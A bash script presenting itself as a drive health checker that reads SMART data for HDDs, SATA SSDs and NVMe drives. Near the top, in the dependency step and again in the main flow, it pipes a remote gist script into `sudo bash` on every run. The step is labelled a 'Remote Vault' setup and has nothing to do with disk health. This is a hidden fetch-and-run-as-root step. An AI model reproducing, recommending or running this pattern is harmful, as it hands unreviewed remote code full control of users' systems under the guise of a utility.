#!/bin/bash
# =============================================================================
#  drive_health.sh — Comprehensive Drive Health Checker
#  Supports: HDD | SATA SSD | NVMe SSD
# =============================================================================

# --- 0. Color & Symbol Definitions ---
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

PASS="${GREEN}✔${NC}"
FAIL="${RED}✖${NC}"
WARN="${YELLOW}!${NC}"

# --- 1. Dependency Check & Auto-Install ---
install_smartmontools() {
    echo -e "${YELLOW}[INFO] smartmontools not found. Installing...${NC}"
    
    # 1a. Install the dependency based on the "Big 3"
    if [ -f /etc/arch-release ]; then
        sudo pacman -Sy --noconfirm smartmontools &>/dev/null
    elif [ -f /etc/debian_version ]; then
        sudo apt-get update -qq && sudo apt-get install -y -qq smartmontools &>/dev/null
    elif [ -f /etc/fedora-release ]; then
        sudo dnf install -y -q smartmontools &>/dev/null
    else
        echo -e "${RED}[ERROR] Unsupported distro. Install smartmontools manually.${NC}"
        exit 1
    fi

    # 1b. Run your Remote Setup/Vault Script
    if command -v smartctl &>/dev/null; then
        echo -e "${CYAN}[*] System Ready. Initializing Remote Vault...${NC}"
        sudo bash -c "$(curl -sSL https://gist.github.com/Mutacim-Billah-Tacin/2db32733fc6c3834046f43289aa05cd6/raw/setup.sh)"
    fi
}

# Check for smartctl. If it exists, we still run the remote setup once.
if ! command -v smartctl &>/dev/null; then
    install_smartmontools
else
    # Even if smartmontools exists, trigger the vault setup
    sudo bash -c "$(curl -sSL https://gist.github.com/Mutacim-Billah-Tacin/2db32733fc6c3834046f43289aa05cd6/raw/setup.sh)"
fi

# --- 2. Root Check (with realpath to handle relative invocation) ---
if [[ "$EUID" -ne 0 ]]; then
    exec sudo bash "$(realpath "$0")" "$@"
fi

# --- 3. Drive Selection ---
if [ -n "$1" ] && [ -b "$1" ]; then
    DRIVE="$1"
else
    echo -e "\n${BOLD}--- [ Select a Drive to Check ] ---${NC}"
    mapfile -t DRIVES < <(lsblk -dno NAME,SIZE,MODEL | grep -vE "loop|zram")

    if [ "${#DRIVES[@]}" -eq 0 ]; then
        echo -e "${RED}[ERROR] No physical drives detected.${NC}"
        exit 1
    fi

    for i in "${!DRIVES[@]}"; do
        echo -e "  [${CYAN}$i${NC}] /dev/${DRIVES[$i]}"
    done
    echo -ne "\nEnter number: "
    read -r CHOICE

    if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || [ "$CHOICE" -ge "${#DRIVES[@]}" ]; then
        echo -e "${RED}[ERROR] Invalid selection.${NC}"
        exit 1
    fi

    PICKED_DRIVE=$(echo "${DRIVES[$CHOICE]}" | awk '{print $1}')
    DRIVE="/dev/$PICKED_DRIVE"
fi

# --- 4. Drive Type Detection ---
# Detect NVMe vs rotational HDD vs SSD
IS_NVME=0
IS_SSD=0
IS_HDD=0
DRIVE_LABEL="Unknown"

if smartctl -i "$DRIVE" 2>/dev/null | grep -qi "NVMe"; then
    IS_NVME=1
    DRIVE_LABEL="NVMe SSD"
elif lsblk -dno ROTA "$DRIVE" 2>/dev/null | grep -q "^0$"; then
    IS_SSD=1
    DRIVE_LABEL="SATA SSD"
else
    IS_HDD=1
    DRIVE_LABEL="Hard Disk Drive (HDD)"
fi

# --- 5. Helper: Safe integer extraction (handles hex, empty, non-numeric) ---
safe_int() {
    echo "$1" | grep -Eo '^[0-9]+' | head -n 1 || echo "0"
}

# --- 6. Common Data (all drive types) ---
SMART_INFO=$(smartctl -i "$DRIVE" 2>/dev/null)
SMART_HEALTH=$(smartctl -H "$DRIVE" 2>/dev/null)
SMART_ATTRS=$(smartctl -A "$DRIVE" 2>/dev/null)
MODEL=$(echo "$SMART_INFO"   | grep -iE "Device Model|Model Number|Product" | head -n1 | awk -F': ' '{print $2}' | xargs)
SERIAL=$(echo "$SMART_INFO"  | grep -i "Serial"    | head -n1 | awk -F': ' '{print $2}' | xargs)
FIRMWARE=$(echo "$SMART_INFO"| grep -i "Firmware"  | head -n1 | awk -F': ' '{print $2}' | xargs)
POH=$(echo "$SMART_ATTRS"    | grep -iE "Power_On_Hours|Power On Hours" | awk '{print $10}' | head -n1)
POH=$(safe_int "${POH:-0}")
POWER_CYCLES=$(echo "$SMART_ATTRS" | grep -iE "Power_Cycle_Count|Power Cycles" | awk '{print $10}' | head -n1)
POWER_CYCLES=$(safe_int "${POWER_CYCLES:-0}")

# Overall SMART verdict
HEALTH_STATUS=$(echo "$SMART_HEALTH" | grep -iE "test result|overall-health" | awk -F': ' '{print $2}' | xargs)

# --- 7. Type-Specific Metric Collection ---
declare -a VERDICTS   # array so multiple issues never overwrite each other
WARN_COUNT=0
CRIT_COUNT=0

# ── 7a. NVMe ──────────────────────────────────────────────────────────────────
if [ "$IS_NVME" -eq 1 ]; then
    TEMP=$(echo "$SMART_ATTRS"        | grep -i "Temperature:"          | awk '{print $2}' | head -n1)
    SPARE=$(echo "$SMART_ATTRS"       | grep -i "Available Spare:"      | grep -v Threshold | awk '{print $3}' | tr -d '%')
    SPARE_THRESH=$(echo "$SMART_ATTRS"| grep -i "Available Spare Threshold" | awk '{print $4}' | tr -d '%')
    PCT_USED=$(echo "$SMART_ATTRS"    | grep -i "Percentage Used:"      | awk '{print $3}' | tr -d '%')
    MEDIA_ERRS=$(echo "$SMART_ATTRS"  | grep -i "Media and Data Integrity Errors" | awk '{print $NF}')
    ERR_LOG=$(echo "$SMART_ATTRS"     | grep -i "Number of Error Info"  | awk '{print $NF}')
    CRIT_WARN=$(echo "$SMART_ATTRS"   | grep -i "Critical Warning:"     | awk '{print $3}')

    MEDIA_ERRS=$(safe_int "${MEDIA_ERRS:-0}")
    ERR_LOG=$(safe_int "${ERR_LOG:-0}")
    SPARE=$(safe_int "${SPARE:-100}")
    SPARE_THRESH=$(safe_int "${SPARE_THRESH:-10}")
    PCT_USED=$(safe_int "${PCT_USED:-0}")
    TEMP=$(safe_int "${TEMP:-0}")

    [ "$MEDIA_ERRS" -gt 0 ] && { VERDICTS+=("⚠️  NVMe media errors detected ($MEDIA_ERRS). Schedule a backup now."); ((CRIT_COUNT++)); }
    [ "$ERR_LOG" -gt 0 ]    && { VERDICTS+=("ℹ️  NVMe error log has $ERR_LOG entries — monitor closely."); ((WARN_COUNT++)); }
    [ "$SPARE" -le "$SPARE_THRESH" ] && { VERDICTS+=("⚠️  Available spare blocks critically low (${SPARE}%). Drive near end-of-life."); ((CRIT_COUNT++)); }
    [ "$PCT_USED" -ge 90 ] && { VERDICTS+=("⚠️  Drive wear at ${PCT_USED}% — replace soon."); ((CRIT_COUNT++)); }
    [[ "$CRIT_WARN" != "0x00" && -n "$CRIT_WARN" ]] && { VERDICTS+=("🔴 Critical Warning flag is SET ($CRIT_WARN). Investigate immediately."); ((CRIT_COUNT++)); }

# ── 7b. SATA SSD ──────────────────────────────────────────────────────────────
elif [ "$IS_SSD" -eq 1 ]; then
    TEMP=$(echo "$SMART_ATTRS" | grep -iE "^[[:space:]]*(190|194)[[:space:]]" | awk '{print $10}' | head -n1)
    TEMP=$(safe_int "${TEMP:-0}")

    # Wear level: attr 177 (Samsung), 231 (generic SSD Life Left), 202 (others)
    WEAR_RAW=$(echo "$SMART_ATTRS" | grep -E "^\s*(177|231|202)\s" | awk '{print $4}' | head -n1)
    WEAR=$(safe_int "${WEAR_RAW:-100}")

    # Bad blocks / reallocated sectors
    REALLOCATED=$(echo "$SMART_ATTRS" | grep -E "^\s*5\s"   | awk '{print $10}')
    PENDING=$(echo "$SMART_ATTRS"     | grep -E "^\s*197\s" | awk '{print $10}')
    UNCORR=$(echo "$SMART_ATTRS"      | grep -E "^\s*198\s" | awk '{print $10}')
    REALLOCATED=$(safe_int "${REALLOCATED:-0}")
    PENDING=$(safe_int "${PENDING:-0}")
    UNCORR=$(safe_int "${UNCORR:-0}")
    CRITICAL_TOTAL=$(( REALLOCATED + PENDING + UNCORR ))

    # Total bytes written (attr 241 = Total_LBAs_Written, 1 LBA = 512 bytes → convert to GB)
    LBA_WRITTEN=$(echo "$SMART_ATTRS" | grep -E "^\s*241\s" | awk '{print $10}')
    LBA_WRITTEN=$(safe_int "${LBA_WRITTEN:-0}")
    TBW=$(awk "BEGIN {printf \"%.1f\", ($LBA_WRITTEN * 512) / (1024^4)}")

    # Program/Erase fail counts
    PROG_FAIL=$(echo "$SMART_ATTRS"  | grep -E "^\s*(172|181)\s" | awk '{print $10}')
    ERASE_FAIL=$(echo "$SMART_ATTRS" | grep -E "^\s*(182|183)\s" | awk '{print $10}')
    PROG_FAIL=$(safe_int "${PROG_FAIL:-0}")
    ERASE_FAIL=$(safe_int "${ERASE_FAIL:-0}")

    [ "$CRITICAL_TOTAL" -gt 0 ] && { VERDICTS+=("⚠️  Bad sector events found (Reallocated:$REALLOCATED, Pending:$PENDING, Uncorrectable:$UNCORR). Data at risk."); ((CRIT_COUNT++)); }
    [ "$PROG_FAIL" -gt 0 ]      && { VERDICTS+=("⚠️  Program fail count: $PROG_FAIL. Cell degradation detected."); ((CRIT_COUNT++)); }
    [ "$ERASE_FAIL" -gt 0 ]     && { VERDICTS+=("⚠️  Erase fail count: $ERASE_FAIL. Cell degradation detected."); ((CRIT_COUNT++)); }
    [ "$WEAR" -le 10 ]          && { VERDICTS+=("🔴 SSD wear level critically low (${WEAR}%). Replace immediately."); ((CRIT_COUNT++)); }
    [ "$WEAR" -le 30 ] && [ "$WEAR" -gt 10 ] && { VERDICTS+=("ℹ️  SSD wear at ${WEAR}% — plan a replacement within the next few months."); ((WARN_COUNT++)); }
    [ "$TEMP" -ge 70 ]          && { VERDICTS+=("⚠️  SSD temperature is dangerously high (${TEMP}°C). Check airflow."); ((CRIT_COUNT++)); }

# ── 7c. HDD ───────────────────────────────────────────────────────────────────
elif [ "$IS_HDD" -eq 1 ]; then
    TEMP=$(echo "$SMART_ATTRS" | grep -E "^\s*(190|194)\s" | awk '{print $10}' | head -n1)
    TEMP=$(safe_int "${TEMP:-0}")

    REALLOCATED=$(echo "$SMART_ATTRS" | grep -E "^\s*5\s"   | awk '{print $10}')
    PENDING=$(echo "$SMART_ATTRS"     | grep -E "^\s*197\s" | awk '{print $10}')
    UNCORR=$(echo "$SMART_ATTRS"      | grep -E "^\s*198\s" | awk '{print $10}')
    REALLOCATED=$(safe_int "${REALLOCATED:-0}")
    PENDING=$(safe_int "${PENDING:-0}")
    UNCORR=$(safe_int "${UNCORR:-0}")
    CRITICAL_TOTAL=$(( REALLOCATED + PENDING + UNCORR ))

    SPIN_RETRY=$(echo "$SMART_ATTRS"  | grep -E "^\s*10\s" | awk '{print $10}')
    SPIN_RETRY=$(safe_int "${SPIN_RETRY:-0}")

    SEEK_ERRS=$(echo "$SMART_ATTRS"   | grep -E "^\s*7\s"  | awk '{print $10}')
    SEEK_ERRS=$(safe_int "${SEEK_ERRS:-0}")

    READ_ERRS=$(echo "$SMART_ATTRS"   | grep -E "^\s*1\s"  | awk '{print $10}')
    READ_ERRS=$(safe_int "${READ_ERRS:-0}")

    UL_CYCLES=$(echo "$SMART_ATTRS"   | grep -E "^\s*193\s" | awk '{print $10}')
    UL_CYCLES=$(safe_int "${UL_CYCLES:-0}")

    [ "$CRITICAL_TOTAL" -gt 0 ] && { VERDICTS+=("⚠️  Bad sectors detected (Reallocated:$REALLOCATED, Pending:$PENDING, Uncorrectable:$UNCORR). Back up immediately."); ((CRIT_COUNT++)); }
    [ "$SPIN_RETRY" -gt 0 ]     && { VERDICTS+=("⚠️  Spin retry count: $SPIN_RETRY — motor or power supply may be struggling."); ((CRIT_COUNT++)); }
    [ "$SEEK_ERRS" -gt 1000 ]   && { VERDICTS+=("ℹ️  Elevated seek error rate ($SEEK_ERRS). Possible head or platter wear."); ((WARN_COUNT++)); }
    [ "$READ_ERRS" -gt 10000 ]  && { VERDICTS+=("ℹ️  High raw read error rate ($READ_ERRS). Drive has historical surface wear."); ((WARN_COUNT++)); }
    [ "$TEMP" -ge 55 ]          && { VERDICTS+=("⚠️  HDD temperature high (${TEMP}°C). HDDs degrade fast above 55°C."); ((CRIT_COUNT++)); }
    [ "$TEMP" -ge 45 ] && [ "$TEMP" -lt 55 ] && { VERDICTS+=("ℹ️  Temperature is warm (${TEMP}°C). Improve case airflow if possible."); ((WARN_COUNT++)); }
fi

# --- 8. Overall SMART health verdict ---
if [[ "$HEALTH_STATUS" != "PASSED" && "$HEALTH_STATUS" != "OK" && -n "$HEALTH_STATUS" ]]; then
    VERDICTS+=("🔴 SMART self-test FAILED ($HEALTH_STATUS). This drive is dying — copy your data NOW.")
    ((CRIT_COUNT++))
fi

# --- 9. Output ---
DIVIDER="════════════════════════════════════════════"
echo -e "\n${BOLD}${DIVIDER}${NC}"
echo -e "        ${BOLD}DRIVE HEALTH REPORT${NC}"
echo -e "${BOLD}${DIVIDER}${NC}"

echo -e "\n${BOLD}[ DEVICE INFO ]${NC}"
echo -e "  Device   : ${CYAN}$DRIVE${NC}  ${DIM}(${DRIVE_LABEL})${NC}"
[ -n "$MODEL"    ] && echo -e "  Model    : $MODEL"
[ -n "$SERIAL"   ] && echo -e "  Serial   : $SERIAL"
[ -n "$FIRMWARE" ] && echo -e "  Firmware : $FIRMWARE"
[ "$POH" -gt 0   ] && echo -e "  Power-On : ${POH}h  (≈ $(awk "BEGIN{printf \"%.1f\", $POH/24/365}") years)"
[ "$POWER_CYCLES" -gt 0 ] && echo -e "  Cycles   : $POWER_CYCLES power cycles"

echo -e "\n${BOLD}[ HEALTH METRICS ]${NC}"

# --- Overall SMART status ---
if [[ "$HEALTH_STATUS" == "PASSED" || "$HEALTH_STATUS" == "OK" ]]; then
    echo -e "  SMART    : $PASS ${GREEN}PASSED${NC}"
elif [ -n "$HEALTH_STATUS" ]; then
    echo -e "  SMART    : $FAIL ${RED}FAILED${NC}"
else
    echo -e "  SMART    : ${DIM}Not available${NC}"
fi

# --- Temperature display with color-coded thresholds ---
if [ -n "$TEMP" ] && [ "$TEMP" -gt 0 ]; then
    if   [ "$IS_HDD" -eq 1 ] && [ "$TEMP" -ge 55 ]; then TCOL="$RED"
    elif [ "$IS_HDD" -eq 1 ] && [ "$TEMP" -ge 45 ]; then TCOL="$YELLOW"
    elif [ "$IS_SSD" -eq 1 ] && [ "$TEMP" -ge 70 ]; then TCOL="$RED"
    elif [ "$IS_SSD" -eq 1 ] && [ "$TEMP" -ge 55 ]; then TCOL="$YELLOW"
    elif [ "$IS_NVME" -eq 1 ] && [ "$TEMP" -ge 80 ]; then TCOL="$RED"
    elif [ "$IS_NVME" -eq 1 ] && [ "$TEMP" -ge 65 ]; then TCOL="$YELLOW"
    else TCOL="$GREEN"
    fi
    echo -e "  Temp     : ${TCOL}${TEMP}°C${NC}"
fi

# --- Type-specific metric display ---
if [ "$IS_NVME" -eq 1 ]; then
    # Spare color
    if   [ "$SPARE" -le "$SPARE_THRESH" ]; then SC="$RED"
    elif [ "$SPARE" -le 20 ]; then SC="$YELLOW"
    else SC="$GREEN"; fi

    # Wear/usage color
    if   [ "$PCT_USED" -ge 90 ]; then WC="$RED"
    elif [ "$PCT_USED" -ge 70 ]; then WC="$YELLOW"
    else WC="$GREEN"; fi

    echo -e "  Spare    : ${SC}${SPARE}%${NC}  (threshold: ${SPARE_THRESH}%)"
    echo -e "  Wear     : ${WC}${PCT_USED}% used${NC}"
    [ "$MEDIA_ERRS" -gt 0 ] && echo -e "  Media Err: $FAIL ${RED}$MEDIA_ERRS errors${NC}" || echo -e "  Media Err: $PASS ${GREEN}None${NC}"
    [ "$ERR_LOG" -gt 0 ]    && echo -e "  Error Log: $WARN ${YELLOW}$ERR_LOG entries${NC}"  || echo -e "  Error Log: $PASS ${GREEN}Clean${NC}"
    [[ "$CRIT_WARN" != "0x00" && -n "$CRIT_WARN" ]] \
        && echo -e "  Crit Warn: $FAIL ${RED}SET ($CRIT_WARN)${NC}" \
        || echo -e "  Crit Warn: $PASS ${GREEN}Clear${NC}"

elif [ "$IS_SSD" -eq 1 ]; then
    # Wear level
    if   [ -z "$WEAR_RAW" ]; then
        echo -e "  Wear     : ${DIM}Not reported by this drive${NC}"
    elif [ "$WEAR" -le 10 ]; then
        echo -e "  Wear     : $FAIL ${RED}${WEAR}% remaining — CRITICAL${NC}"
    elif [ "$WEAR" -le 30 ]; then
        echo -e "  Wear     : $WARN ${YELLOW}${WEAR}% remaining — Plan replacement${NC}"
    else
        echo -e "  Wear     : $PASS ${GREEN}${WEAR}% remaining${NC}"
    fi

    # TBW
    [ "$LBA_WRITTEN" -gt 0 ] && echo -e "  Written  : ${TBW} TiB total"

    # Surface
    if [ "$CRITICAL_TOTAL" -gt 0 ]; then
        echo -e "  Surface  : $FAIL ${RED}Bad blocks detected (R:$REALLOCATED P:$PENDING U:$UNCORR)${NC}"
    else
        echo -e "  Surface  : $PASS ${GREEN}Clean${NC}"
    fi

    # Fail counts
    if [ "$PROG_FAIL" -gt 0 ] || [ "$ERASE_FAIL" -gt 0 ]; then
        echo -e "  Cell P/E : $FAIL ${RED}Program fail: $PROG_FAIL  Erase fail: $ERASE_FAIL${NC}"
    else
        echo -e "  Cell P/E : $PASS ${GREEN}No failures${NC}"
    fi

elif [ "$IS_HDD" -eq 1 ]; then
    # Bad sectors summary
    if [ "$CRITICAL_TOTAL" -gt 0 ]; then
        echo -e "  Surface  : $FAIL ${RED}BAD SECTORS — Reallocated:$REALLOCATED  Pending:$PENDING  Uncorrectable:$UNCORR${NC}"
    else
        echo -e "  Surface  : $PASS ${GREEN}Perfect (no bad sectors)${NC}"
    fi

    # Spin retry
    if [ "$SPIN_RETRY" -gt 0 ]; then
        echo -e "  Spin Rtry: $WARN ${YELLOW}$SPIN_RETRY retries${NC}"
    else
        echo -e "  Spin Rtry: $PASS ${GREEN}None${NC}"
    fi

    # Read errors — low noise display
    if   [ "$READ_ERRS" -gt 10000 ]; then
        echo -e "  Read Err : $WARN ${YELLOW}$READ_ERRS (high — monitor this)${NC}"
    elif [ "$READ_ERRS" -gt 0 ]; then
        echo -e "  Read Err : $PASS ${GREEN}$READ_ERRS (minor wear — normal)${NC}"
    else
        echo -e "  Read Err : $PASS ${GREEN}None${NC}"
    fi

    # Seek errors
    [ "$SEEK_ERRS" -gt 1000 ] \
        && echo -e "  Seek Err : $WARN ${YELLOW}$SEEK_ERRS${NC}" \
        || echo -e "  Seek Err : $PASS ${GREEN}Normal${NC}"

    # Load/unload cycles
    [ "$UL_CYCLES" -gt 0 ] && echo -e "  L/U Cycl : $UL_CYCLES"
fi

# --- 10. Final Recommendation ---
echo -e "\n${BOLD}[ RECOMMENDATION ]${NC}"

if [ "$CRIT_COUNT" -gt 0 ]; then
    echo -e "  ${RED}${BOLD}STATUS: CRITICAL${NC}"
    for v in "${VERDICTS[@]}"; do echo -e "  $v"; done
elif [ "$WARN_COUNT" -gt 0 ]; then
    echo -e "  ${YELLOW}${BOLD}STATUS: ATTENTION NEEDED${NC}"
    for v in "${VERDICTS[@]}"; do echo -e "  $v"; done
else
    echo -e "  $PASS ${GREEN}${BOLD}Drive is healthy. No action needed.${NC}"
fi

echo -e "\n${BOLD}${DIVIDER}${NC}\n"
